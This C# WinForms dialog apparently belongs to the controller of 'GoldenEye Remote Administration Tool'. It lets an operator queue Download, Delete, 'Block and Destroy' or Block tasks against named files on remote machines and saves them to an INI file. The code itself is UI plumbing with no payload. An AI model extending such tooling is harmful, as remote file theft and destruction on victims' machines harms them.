using System;
using System.IO;
using System.Windows.Forms;

namespace GoldenEye_Remote_Administration_Tool.Forms
{
    public partial class FileSearcherDialog : Form
    {
        public Form1 prd;

        public FileSearcherDialog(Form1 frm1)
        {
            InitializeComponent();
            prd = frm1;
        }

        private void FileSearcherDialog_Load(object sender, EventArgs e)
        {
        }

        private void velyseButton1_Click(object sender, EventArgs e)
        {
            string filename = t_TextBox1.Text;
            string seltxt = velyseComboBox1.GetItemText(velyseComboBox1.SelectedItem);
            string taskmbr = (prd.listView7.Items.Count + 1).ToString();
            string action = string.Empty;

            if (velyseRadioButton1.Checked == true)
            {
                action = "Download";
            }
            else if (velyseRadioButton2.Checked == true)
            {
                action = "Delete";
            }
            else if (velyseRadioButton3.Checked == true)
            {
                action = "Block and Destroy";
            }
            else
            {
                action = "Block";
            }
            ListViewItem item = new ListViewItem();
            item.Text = filename;
            item.SubItems.Add(seltxt);
            item.SubItems.Add(action);
            item.SubItems.Add(taskmbr);
            prd.listView7.Items.Add(item);
            string final = "";
            foreach (ListViewItem it in prd.listView7.Items)
            {
                final += it.Text + "²" + it.SubItems[1].Text + "²" + it.SubItems[2].Text + "²" + it.SubItems[3].Text + "³";
            }
            File.WriteAllText(Application.StartupPath + @"\Configuration\FileSearcherTasks.ini", final);
            this.Close();
        }

        private void velyseForm1_Click(object sender, EventArgs e)
        {
        }
    }
}